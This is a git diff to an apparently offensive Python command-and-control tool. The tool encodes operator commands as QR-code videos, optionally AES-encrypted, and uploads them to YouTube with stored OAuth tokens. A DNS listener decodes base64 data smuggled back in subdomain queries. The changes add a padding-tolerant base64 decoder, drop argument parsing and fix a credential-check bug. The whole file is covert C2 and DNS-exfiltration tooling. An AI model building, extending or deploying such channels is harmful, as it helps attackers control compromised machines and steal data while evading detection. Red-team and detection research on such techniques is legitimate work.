@@ -3,9 +3,7 @@ from youtube_upload.client import YoutubeUploader
 from Crypto.Cipher import AES
 from dnslib import DNSRecord
 from glob import glob
-import argparse
 import datetime
-import random
 import base64
 import socket
 import rebus
@@ -14,6 +12,25 @@ import sys
 import re
 import os
 import config
+
+
+def decode_base64(encoded_str):
+	try:
+		decoded_string = base64.b64decode(encoded_str).decode("utf-8")
+		return decoded_string
+	except:
+		pass
+	try:
+		decoded_string = base64.b64decode(encoded_str+"=").decode("utf-8")
+		return decoded_string
+	except:
+		pass
+	try:
+		decoded_string = base64.b64decode(encoded_str+"==").decode("utf-8")
+		return decoded_string
+	except:
+		pass
+	return ""
 
 
 def listener(ns_subdomain, log_file):
@@ -54,12 +71,9 @@ def listener(ns_subdomain, log_file):
 				f.close()
 				# Decode subdomain if possible
 				print("[+] Encoded string:\t" + subdomain_base64_aux)
-				try:
-					decoded_msg = base64.b64decode(subdomain_base64_aux)
-					decoded_string = decoded_msg.decode("utf-8")
-					print("[+] Result: \n" + decoded_string)
-				except:
-					pass
+				decoded_str = decode_base64(subdomain_base64_aux)
+				if decoded_str != "":
+					print("[+] Result: \n" + decoded_str)
 
 		except socket.timeout:
 			if subdomain_base64_aux != "":
@@ -131,25 +145,14 @@ def generate_video(image_type, video_file, aes_key, aes_iv, command):
 	os.remove("image.png")
 
 
-def get_args():
-	parser = argparse.ArgumentParser()
-	parser.add_argument('-t', '--type', required=True, action='store', help='Type')
-	parser.add_argument('-f', '--file', required=True, action='store', help='Video file path')
-	parser.add_argument('-c', '--command', required=True, action='store', help='Command')
-	parser.add_argument('-k', '--aeskey', required=False, action='store', help='AES key')
-	parser.add_argument('-i', '--aesiv', required=False, action='store', help='IV')
-	my_args = parser.parse_args()
-	return my_args
-
-
 def upload_video(video_name):
 	client_id = config.client_id
 	client_secret = config.client_secret
 	access_token_  = config.access_token_
 	refresh_token_ = config.refresh_token_
 
-	if (client_id == "" or client_secret == "" or access_token_ == "" or refresh_token == ""):
-		print("[-] Some values are missing in config.py file")
+	if (client_id == "" or client_secret == "" or access_token_ == "" or refresh_token_ == ""):
+		print("[-] Some values are missing in config.py file\n")
 		main_loop()
 	print("[+] Uploading video...")
 	uploader = YoutubeUploader(client_id, client_secret)
@@ -166,7 +169,7 @@ def upload_video(video_name):
 	uploader.upload(video_name, options)
 	uploader.close()
 	os.remove(video_name)
-	print("[+] Video uploaded")
+	print("[+] Video uploaded\n")
 
 
 def showHelp():
@@ -180,9 +183,10 @@ def main_loop():
 			command_ = input("[+] Command: ")
 			type_ = input("[+] Type (\"qr\" or \"qr_aes\"): ")
 			if (type_ != "qr" and type_ != "qr_aes"):
-				print("[-] Type value must be \"qr\" or \"qr_aes\"")
+				print("[-] Type value must be \"qr\" or \"qr_aes\"\n")
+				main_loop()
 			aeskey = ""
-			aesiv = ""
+			aesiv  = ""
 			if type_ == "qr_aes":
 				aeskey = input("[+] AES key (example: \"0000000000000000\"): ")
 				if(len(aeskey) % 16 != 0):
